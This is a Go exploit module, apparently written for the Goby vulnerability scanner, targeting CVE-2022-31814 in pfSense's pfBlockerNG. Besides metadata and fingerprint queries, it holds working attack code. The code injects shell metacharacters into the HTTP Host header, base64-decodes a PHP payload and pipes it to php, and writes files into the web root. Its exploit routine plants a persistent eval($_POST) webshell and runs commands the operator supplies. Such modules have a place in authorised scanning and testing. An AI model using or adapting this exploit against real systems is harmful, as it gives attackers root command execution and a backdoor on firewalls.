package exploits

import (
	"crypto/tls"
	"encoding/base64"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "pfSense Host RCE (CVE-2022-31814)",
    "Description": "<p>pfSense is a network firewall based on FreeBSD Linux.</p><p>There was a security vulnerability in pfSense pfBlockerNG prior to version 2.1.4_26. A remote attacker can execute arbitrary operating system commands as root via the shell metacharacter in the HTTP host header.</p>",
    "Impact": "pfSense Host RCE (CVE-2022-31814)",
    "Recommendation": "<p>At present, the manufacturer has released an upgrade patch to fix the vulnerability. The link to obtain the patch: <a href=\"https://docs.netgate.com/pfsense/en/latest/packages/pfblocker.html\">https://docs.netgate.com/pfsense/en/latest/packages/pfblocker.html</a></p>",
    "Product": "pfsense",
    "VulType": [
        "Command Execution"
    ],
    "Tags": [
        "Command Execution"
    ],
    "Translation": {
        "CN": {
            "Name": "pfSense 防火墙 Host 远程命令执行漏洞 （CVE-2022-31814）",
            "Description": "<p>pfSense是一套基于FreeBSD Linux的网络防火墙。<br></p><p>pfSense pfBlockerNG 2.1.4_26 版本之前存在安全漏洞。远程攻击者通过 HTTP 主机标头中的 shell 元字符以 root 身份可以执行任意操作系统命令。<br></p>",
            "Impact": "<p>pfSense pfBlockerNG 2.1.4_26 版本之前存在安全漏洞。远程攻击者通过 HTTP 主机标头中的 shell 元字符以 root 身份可以执行任意操作系统命令。<br></p>",
            "Recommendation": "<p>目前厂商已发布升级补丁以修复漏洞，补丁获取链接：<a href=\"https://docs.netgate.com/pfsense/en/latest/packages/pfblocker.html\">https://docs.netgate.com/pfsense/en/latest/packages/pfblocker.html</a><br></p>",
            "Product": "pfsense-产品",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "pfSense Host RCE (CVE-2022-31814)",
            "Description": "<p>pfSense is a network firewall based on FreeBSD Linux.<br></p><p>There was a security vulnerability in pfSense pfBlockerNG prior to version 2.1.4_26. A remote attacker can execute arbitrary operating system commands as root via the shell metacharacter in the HTTP host header.<br></p>",
            "Impact": "pfSense Host RCE (CVE-2022-31814)",
            "Recommendation": "<p>At present, the manufacturer has released an upgrade patch to fix the vulnerability. The link to obtain the patch: <a href=\"https://docs.netgate.com/pfsense/en/latest/packages/pfblocker.html\">https://docs.netgate.com/pfsense/en/latest/packages/pfblocker.html</a><br></p>",
            "Product": "pfsense",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "FofaQuery": "(banner=\"pfSense \" && protocol=\"snmp\") || body=\"https://www.pfsense.org/?gui=bootstrap\" || body=\"Rubicon Communications, LLC (Netgate)\" || body=\"<h4>Login to pfSense</h4>\" ||(body=\"<title id=\\\"pfsense-logo-svg\\\">pfSense Logo</title>\" && body=\"CsrfMagic.end\")",
    "GobyQuery": "(banner=\"pfSense \" && protocol=\"snmp\") || body=\"https://www.pfsense.org/?gui=bootstrap\" || body=\"Rubicon Communications, LLC (Netgate)\" || body=\"<h4>Login to pfSense</h4>\" ||(body=\"<title id=\\\"pfsense-logo-svg\\\">pfSense Logo</title>\" && body=\"CsrfMagic.end\")",
    "Author": "csca",
    "Homepage": "https://www.pfsense.org/",
    "DisclosureDate": "2022-09-19",
    "References": [
        "https://github.com/EvergreenCartoons/SenselessViolence"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "10",
    "CVEIDs": [
        "CVE-2022-31814"
    ],
    "CNVD": [],
    "CNNVD": [
        "CNNVD-202209-216"
    ],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "system('id');",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10670"
}`

	TCPSend := func(host string, payload string) string {
		conf := &tls.Config{
			InsecureSkipVerify: true,
		}
		conn, err := tls.Dial("tcp", host, conf)
		if err != nil {
			return ""
		}
		defer conn.Close()
		_, err = conn.Write([]byte(payload))
		buf := make([]byte, 4096)
		resp := ""
		for {
			count, err := conn.Read(buf)
			tmpMsg := string(buf[0:count])
			resp += tmpMsg
			if err != nil {
				break
			}
		}
		return resp
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri1 := "/pfblockerng/www/index.php"
			cfg1 := httpclient.NewGetRequestConfig(uri1)
			cfg1.VerifyTls = false
			cfg1.FollowRedirect = false
			if resp, err := httpclient.DoHttpRequest(u, cfg1); err == nil {
				if resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "GIF89a") {
					RandName := goutils.RandomHexString(8)
					Webshell := fmt.Sprintf("<?$a=fopen(\"/usr/local/www/%s.php\",\"w\") or die();$t='<?php echo md5(233);unlink(__FILE__);?>';fwrite($a,$t);fclose( $a);?>", RandName)
					Base64Webshell := fmt.Sprintf("' *; echo '%s'|python3.8 -m base64 -d | php; '", base64.StdEncoding.EncodeToString([]byte(Webshell)))
					data := fmt.Sprintf("GET /pfblockerng/www/index.php HTTP/1.1\r\nHost: %s\r\nUser-Agent: python-requests/2.28.0\r\nAccept: */*\r\nConnection: close\r\n\r\n", Base64Webshell)
					TCPSend(u.HostInfo, data)
					time.Sleep(time.Second * 2)
					uri2 := "/" + RandName + ".php"
					cfg2 := httpclient.NewGetRequestConfig(uri2)
					cfg2.VerifyTls = false
					cfg2.FollowRedirect = false
					if resp2, err := httpclient.DoHttpRequest(u, cfg2); err == nil {
						return strings.Contains(resp2.Utf8Html, "e165421110ba03099a1c0393373c5b43")
					}
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["AttackType"].(string)
			uri1 := "/pfblockerng/www/index.php"
			cfg1 := httpclient.NewGetRequestConfig(uri1)
			cfg1.VerifyTls = false
			cfg1.FollowRedirect = false
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg1); err == nil {
				if resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "GIF89a") {
					RandName := goutils.RandomHexString(8)
					Webshell := fmt.Sprintf("<?$a=fopen(\"/usr/local/www/%s.php\",\"w\") or die();$t='<?php eval($_POST[123]);?>';fwrite($a,$t);fclose( $a);?>", RandName)
					Base64Webshell := fmt.Sprintf("' *; echo '%s'|python3.8 -m base64 -d | php; '", base64.StdEncoding.EncodeToString([]byte(Webshell)))
					data := fmt.Sprintf("GET /pfblockerng/www/index.php HTTP/1.1\r\nHost: %s\r\nUser-Agent: python-requests/2.28.0\r\nAccept: */*\r\nConnection: close\r\n\r\n", Base64Webshell)
					TCPSend(expResult.HostInfo.HostInfo, data)
					time.Sleep(time.Second * 2)
					uri2 := "/" + RandName + ".php"
					cfg2 := httpclient.NewPostRequestConfig(uri2)
					cfg2.VerifyTls = false
					cfg2.FollowRedirect = false
					cfg2.Header.Store("Content-Type", "application/x-www-form-urlencoded")
					cfg2.Data = `123=` + cmd
					if resp2, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg2); err == nil {
						expResult.Output = resp2.Utf8Html
						expResult.Success = true
					}
				}
			}
			return expResult
		},
	))
}
